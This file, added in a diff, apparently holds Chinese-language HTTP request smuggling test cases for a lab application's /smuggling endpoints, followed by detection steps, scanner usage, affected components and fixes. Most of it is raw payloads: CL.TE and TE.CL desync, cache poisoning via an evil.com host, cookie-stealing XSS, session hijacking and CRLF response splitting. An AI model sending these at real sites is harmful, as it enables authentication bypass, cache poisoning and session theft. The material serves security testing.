@@ -1,0 +1,354 @@
+# HTTP 请求走私漏洞测试用例
+# 漏洞类型: HTTP Request Smuggling (CL.TE / TE.CL)
+# 危险等级: 高危 (High)
+
+# ============================================
+# 1. CL.TE Smuggling - 基础测试
+# ============================================
+# 场景: 前端使用 Content-Length，后端使用 Transfer-Encoding
+# 端点: POST /smuggling/clte
+
+# 基础 CL.TE Payload
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+# ============================================
+# 2. TE.CL Smuggling - 基础测试
+# ============================================
+# 场景: 前端使用 Transfer-Encoding，后端使用 Content-Length
+# 端点: POST /smuggling/tecl
+
+# 基础 TE.CL Payload
+POST /smuggling/tecl HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+Content-Length: 10
+
+5
+hello
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+# ============================================
+# 3. CL.CL Smuggling - 双 Content-Length
+# ============================================
+# 场景: 前端和后端对多个 Content-Length 处理方式不同
+# 端点: POST /smuggling/clcl
+
+# 双 Content-Length Payload
+POST /smuggling/clcl HTTP/1.1
+Host: localhost
+Content-Length: 10
+Content-Length: 5
+
+helloGET /admin HTTP/1.1
+
+
+# ============================================
+# 4. 缓存投毒攻击
+# ============================================
+# 场景: 走私请求污染前端缓存
+# 端点: POST /smuggling/cache
+
+# 缓存投毒 Payload
+POST /smuggling/cache HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: evil.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /static/css.css HTTP/1.1
+Host: localhost
+X-Forwarded-Host: evil.com
+
+
+# ============================================
+# 5. 绕过 WAF/认证
+# ============================================
+# 场景: 走私请求访问受保护的端点
+# 端点: GET /smuggling/admin
+
+# 绕过认证 Payload
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /smuggling/admin HTTP/1.1
+Host: localhost
+Cookie: admin=true
+
+
+# ============================================
+# 6. XSS 通过缓存投毒
+# ============================================
+# 场景: 走私恶意响应到缓存
+# 端点: POST /smuggling/cache
+
+# XSS 缓存投毒
+POST /smuggling/cache HTTP/1.1
+Host: localhost
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<script>alert(document.cookie)</script>
+
+
+# ============================================
+# 7. 会话劫持
+# ============================================
+# 场景: 走私请求获取其他用户的会话
+
+# 会话劫持 Payload
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+GET /api/user/me HTTP/1.1
+Host: localhost
+Cookie: session=victim_session_id
+
+
+# ============================================
+# 8. 响应拆分
+# ============================================
+# 场景: 通过走私修改 HTTP 响应
+
+# 响应拆分 Payload
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: %0d%0aContent-Length:%200%0d%0a%0d%0a
+
+
+# ============================================
+# 9. 隐藏的走私请求
+# ============================================
+# 使用隐蔽的分隔符
+
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 4
+Transfer-Encoding: chunked
+
+3
+abc
+0
+
+GET /hidden HTTP/1.1
+Host: localhost
+
+
+# ============================================
+# 10. 高级技术 - 双 URL 编码
+# ============================================
+
+# 双重编码的 Chunked 头
+POST /smuggling/clte HTTP/1.1
+Host: localhost
+Content-Length: 50
+Transfer-Encoding%3A%20chunked: chunked
+
+0
+
+GET /admin HTTP/1.1
+
+
+# ============================================
+# 11. HTTP/2 Downgrade
+# ============================================
+# 将 HTTP/2 请求降级为 HTTP/1.1 进行走私
+
+# HTTP/2 -> HTTP/1.1 Smuggling
+POST /smuggling/tecl HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+Content-Length: 0
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+# ============================================
+# 12. 测试方法
+# ============================================
+
+# 方法 1: 时间延迟检测
+# 发送走私请求，然后立即访问目标端点
+# 如果响应异常快速或包含走私请求的内容，则存在漏洞
+
+# 方法 2: 差异分析
+# 比较正常请求和走私请求的响应差异
+
+# 方法 3: 使用工具检测
+# 推荐工具:
+# - smuggler: https://github.com/defparam/smuggler
+# - httpsmuggle: https://github.com/Hadesy2k1/httpsmuggle
+# - burp-request-smuggler: https://github.com/narind
+
+
+# ============================================
+# 13. Smuggler 工具使用
+# ============================================
+
+# 安装
+# pip3 install httpsmuggle
+
+# 基础扫描
+# smuggler https://example.com/
+
+# 指定端点
+# smuggler https://example.com/ --endpoint /smuggling/clte
+
+# 使用自定义 payload
+# httpsmuggle -u https://example.com/ -p custom_payload.txt
+
+
+# ============================================
+# 14. 手动测试步骤
+# ============================================
+
+# 步骤 1: 确定前端代理类型
+# - 检查响应头 Server:
+# - 常见代理: Nginx, HAProxy, AWS ALB
+
+# 步骤 2: 测试 CL.TE
+# - 发送包含 Content-Length 和 Transfer-Encoding 的请求
+# - Content-Length 设为一个较大值
+# - Transfer-Encoding 设为 chunked，body 为 "0\r\n\r\n"
+
+# 步骤 3: 测试 TE.CL
+# - 发送包含 Content-Length 和 Transfer-Encoding 的请求
+# - Transfer-Encoding 设为 chunked
+# - Content-Length 设为一个较小值
+
+# 步骤 4: 验证走私
+# - 发送第二个请求到目标端点
+# - 检查是否收到走私请求的响应
+
+
+# ============================================
+# 15. 检测成功的特征
+# ============================================
+
+# 1. 响应包含预期之外的内容
+# 2. 响应状态码异常
+# 3. 响应头包含走私请求的信息
+# 4. 时间延迟异常
+# 5. 缓存被污染
+# 6. 认证被绕过
+
+
+# ============================================
+# 16. 常见受影响的组件
+# ============================================
+
+# 前端代理:
+# - Nginx (某些版本)
+# - HAProxy (某些版本)
+# - AWS ALB
+# - Cloudflare
+# - Akamai
+
+# 后端服务器:
+# - Apache Tomcat
+# - Jetty
+# - WebLogic
+# - WebSphere
+# - JBoss
+
+
+# ============================================
+# 17. 修复建议
+# ============================================
+
+# 前端代理配置:
+# 1. 禁用 Transfer-Encoding: chunked
+# 2. 只使用 Content-Length
+# 3. 验证请求格式
+
+# 后端服务器配置:
+# 1. 统一请求处理方式
+# 2. 拒绝包含冲突头的请求
+# 3. 检测走私模式
+
+# 通用建议:
+# 1. 升级到最新版本
+# 2. 使用 HTTP/2 或 HTTP/3
+# 3. 部署 WAF 规则检测走私
+# 4. 定期进行安全测试
+
+
+# ============================================
+# 18. Burp Suite 测试
+# ============================================
+
+# 使用 Burp Request Smuggler 插件:
+# 1. 安装插件
+# 2. 发送正常请求到 Repeater
+# 3. 右键 -> Request Smuggler
+# 4. 选择测试类型 (CL.TE, TE.CL, CL.CL)
+# 5. 点击 Attack
+# 6. 分析结果
+
+
+# ============================================
+# 19. 实际攻击场景
+# ============================================
+
+# 场景 1: 绕过 WAF
+# - WAF 检测第一个请求（安全）
+# - 走私的请求绕过 WAF
+
+# 场景 2: 缓存投毒
+# - 走私恶意响应
+# - 其他用户访问时获取恶意内容
+
+# 场景 3: 会话劫持
+# - 走私请求获取受害者会话
+# - 利用会话进行操作
+
+# 场景 4: 权限提升
+# - 走私管理员请求
+# - 绕过前端认证
+
+
+# ============================================
+# 20. 参考资料
+# ============================================
+
+# - HTTP Request Smuggling: https://portswigger.net/web-security/request-smuggling
+# - CL.TE Request Smuggling: https://portswigger.net/web-security/request-smuggling/cl-te
+# - TE.CL Request Smuggling: https://portswigger.net/web-security/request-smuggling/te-cl
+# - HTTP Desync Attacks: https://resources.james.sh/assets/desync-bh-us-18.pdf
